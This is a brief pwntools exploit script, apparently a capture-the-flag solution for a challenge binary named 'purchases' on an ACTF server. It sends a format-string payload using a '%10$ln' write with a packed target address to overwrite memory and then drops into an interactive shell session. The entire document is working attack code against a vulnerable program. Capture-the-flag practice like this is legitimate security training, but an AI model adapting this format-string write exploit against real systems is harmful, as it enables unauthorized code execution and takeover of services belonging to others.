from pwn import *

r=remote('shell.actf.co',19011)
#r=process("./purchases")
b=ELF('./purchases')

pay=''
pay+='%4198838x'
pay+='%10$ln'
pay+=' '
pay+='\x18\x40\x40\x33'

r.sendline(pay)
r.interactive()

